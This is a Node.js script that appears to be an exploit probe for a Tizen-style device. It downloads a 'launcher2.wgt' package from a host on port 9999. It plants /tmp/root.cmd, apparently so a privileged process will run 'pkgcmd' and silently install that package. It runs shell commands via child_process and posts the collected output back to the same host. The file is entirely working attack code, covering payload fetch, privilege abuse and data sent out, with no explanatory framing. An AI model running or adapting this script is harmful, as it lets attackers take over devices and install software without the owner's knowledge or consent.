"use strict";
var cp = null;
try { cp = require('child_process'); } catch (e) {}
var fs = require('fs');
var http = require('http');
var net = require('net');
var HOST='192.168.1.61', PORT=9999;
var BASE='/home/owner/share/tmp/sdk_tools';
var R={ts:new Date().toISOString(), probe:'p143', results:{}, log:[]};
var posted=false;
function L(s){R.log.push(String(s).substring(0,500));}
function postBuf(path,buf){try{var hdr='POST '+path+' HTTP/1.1\r\nHost: '+HOST+':'+PORT+'\r\nContent-Type: application/octet-stream\r\nContent-Length: '+buf.length+'\r\nConnection: close\r\n\r\n';var s=net.connect(PORT,HOST);s.on('connect',function(){s.write(hdr);s.write(buf);setTimeout(function(){s.destroy()},5000)});s.on('error',function(e){L('post err '+e.message)});}catch(e){L('post ctor '+e);}}
function postFinal(){if(posted)return;posted=true;postBuf('/p143info',new Buffer(JSON.stringify(R),'utf8'));}
function run(cmd,timeoutMs,maxLen){maxLen=maxLen||4000;if(!cp)return '[no cp]';try{var out=cp.execSync(cmd,{timeout:timeoutMs||25000,maxBuffer:16*1024*1024}).toString().trim();return '[exit 0] '+out.substring(0,maxLen);}catch(e){var o='';if(e.stdout)o+=e.stdout.toString();if(e.stderr)o+=(o?'\n':'')+e.stderr.toString();return '[exit '+(e.status===undefined?'?':e.status)+'] '+(o||(e&&e.message)||'unknown').substring(0,maxLen);}}
function download(url, path, cb){
  var req = http.get(url, function(res){
    var chunks=[];
    res.on('data', function(c){ chunks.push(c); });
    res.on('end', function(){
      try { var buf=Buffer.concat(chunks); fs.writeFileSync(path, buf); cb(null, res.statusCode, buf.length); }
      catch(e){ cb(e); }
    });
  });
  req.on('error', function(e){ cb(e); });
  req.setTimeout(20000, function(){ req.abort(); cb(new Error('timeout')); });
}
function main(){
  download('http://192.168.1.61:9999/launcher2.wgt', BASE+'/launcher2.wgt', function(err, status, len){
    if (err) { R.results.download='ERR '+String(err); L('download err'); }
    else {
      R.results.download='[http '+status+'] '+len+'B';
      R.results.ls=run('ls -la '+BASE+'/launcher2.wgt; md5sum '+BASE+'/launcher2.wgt 2>&1',10000,1000);
      var script='#!/bin/sh\nwhich pkgcmd > '+BASE+'/pkgproof.txt 2>&1\npkgcmd -i -t wgt -p '+BASE+'/launcher2.wgt -q -G >> '+BASE+'/pkgproof.txt 2>&1\necho rc=$? >> '+BASE+'/pkgproof.txt\n#END\n';
      try { fs.writeFileSync('/tmp/root.cmd', script); R.results.rootcmd='[written]'; }
      catch(e){ R.results.rootcmd='ERR '+String(e); }
      R.results.rootcmdls=run('ls -la /tmp/root.cmd; tail -3 /tmp/root.cmd 2>&1',10000,1000);
      run('sleep 10',10000,100);
      R.results.proof=run('cat '+BASE+'/pkgproof.txt 2>&1',10000,6000);
    }
    R.results.final='done '+new Date().toISOString();
    L('done');
    postFinal();
    setTimeout(postFinal,20000);
  });
}
try{main();}catch(e){R.results.fatal=String(e)+' | '+(e.stack||'no-stack');postFinal();}
